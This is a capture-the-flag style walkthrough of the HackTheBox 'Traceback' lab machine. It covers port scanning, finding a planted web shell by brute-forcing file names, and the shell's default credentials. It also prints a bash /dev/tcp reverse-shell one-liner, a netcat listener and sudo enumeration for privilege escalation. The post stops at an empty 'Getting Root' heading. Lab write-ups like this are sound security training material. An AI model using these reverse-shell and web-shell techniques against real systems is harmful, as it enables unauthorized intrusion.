---
layout: post
title: Hackthebox Traceback Walkthrough
categories: HackTheBox
---

![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-08-31/traceback.png)

# Explanation
[Hackthebox](https://www.hackthebox.eu/) is a website which has a bunch of vulnerable machines in its own VPN.<br>
This is a walkthrough of a box `Traceback`.

# Solution
## 1. Initial Enumeration
#### TCP Port Scanning:
```shell
root@kali:~# nmap -p- 10.10.10.181 -sV -sC
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-30 16:38 JST
Nmap scan report for 10.10.10.181
Host is up (0.23s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 742.50 seconds
```

## 2. Getting User

```shell
root@kali:~# curl -s 10.10.10.181 | tail
</head>
<body>
	<center>
		<h1>This site has been owned</h1>
		<h2>I have left a backdoor for all the net. FREE INTERNETZZZ</h2>
		<h3> - Xh4H - </h3>
		<!--Some of the best web shells that you might need ;)-->
	</center>
</body>
</html>
```

```shell
root@kali:~# git clone https://github.com/TheBinitGhimire/Web-Shells.git

---

root@kali:~# ls Web-Shells/ > wordlist.txt

root@kali:~# cat wordlist.txt 
alfa3.php
alfav3.0.1.php
andela.php
bloodsecv4.php
by.php
c99ud.php
cmd.php
configkillerionkros.php
jspshell.jsp
mini.php
obfuscated-punknopass.php
punkholic.php
punk-nopass.php
r57.php
README.md
smevk.php
wso2.8.5.php
```


```shell
root@kali:~# gobuster dir -u http://10.10.10.181 -w /root/wordlist.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.181
[+] Threads:        10
[+] Wordlist:       /root/wordlist.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/30 17:16:36 Starting gobuster
===============================================================
/smevk.php (Status: 200)
===============================================================
2020/08/30 17:16:39 Finished
===============================================================
```

```
root@kali:~# cat Web-Shells/smevk.php | head -n 15
<?php 
/*

SmEvK_PaThAn Shell v3 Coded by Kashif Khan .
https://www.facebook.com/smevkpathan
smevkpathan@gmail.com
Edit Shell according to your choice.
Domain read bypass.
Enjoy!

*/
//Make your setting here.
$deface_url = 'http://pastebin.com/raw.php?i=FHfxsFGT';  //deface url here(pastebin).
$UserName = "admin";                                      //Your UserName here.
$auth_pass = "admin";                                  //Your Password.
```

```shell
root@kali:~# nc -nlvp 4443
listening on [any] 4443 ...

```


```shell
bash -c 'bash -i >& /dev/tcp/10.10.14.42/4443 0>&1'
```

```shell
root@kali:~# nc -nlvp 4443
listening on [any] 4443 ...
connect to [10.10.14.42] from (UNKNOWN) [10.10.10.181] 35966
bash: cannot set terminal process group (525): Inappropriate ioctl for device
bash: no job control in this shell
webadmin@traceback:/var/www/html$ whoami
whoami
webadmin
```

```shell

webadmin@traceback:/home/webadmin$ ls -la
ls -la
total 44
drwxr-x--- 5 webadmin sysadmin 4096 Mar 16 04:03 .
drwxr-xr-x 4 root     root     4096 Aug 25  2019 ..
-rw------- 1 webadmin webadmin  105 Mar 16 04:03 .bash_history
-rw-r--r-- 1 webadmin webadmin  220 Aug 23  2019 .bash_logout
-rw-r--r-- 1 webadmin webadmin 3771 Aug 23  2019 .bashrc
drwx------ 2 webadmin webadmin 4096 Aug 23  2019 .cache
drwxrwxr-x 3 webadmin webadmin 4096 Aug 24  2019 .local
-rw-rw-r-- 1 webadmin webadmin    1 Aug 25  2019 .luvit_history
-rw-r--r-- 1 webadmin webadmin  807 Aug 23  2019 .profile
drwxrwxr-x 2 webadmin webadmin 4096 Feb 27  2020 .ssh
-rw-rw-r-- 1 sysadmin sysadmin  122 Mar 16 03:53 note.txt
```

```shell
webadmin@traceback:/home/webadmin$ cat note.txt	
cat note.txt
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.
```

```shell
webadmin@traceback:/home/webadmin$ sudo -l
sudo -l
Matching Defaults entries for webadmin on traceback:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on traceback:
    (sysadmin) NOPASSWD: /home/sysadmin/luvit
```


```shell
webadmin@traceback:/home/webadmin$ cat .bash_history
cat .bash_history
ls -la
sudo -l
nano privesc.lua
sudo -u sysadmin /home/sysadmin/luvit privesc.lua 
rm privesc.lua
logout
```


## 3. Getting Root

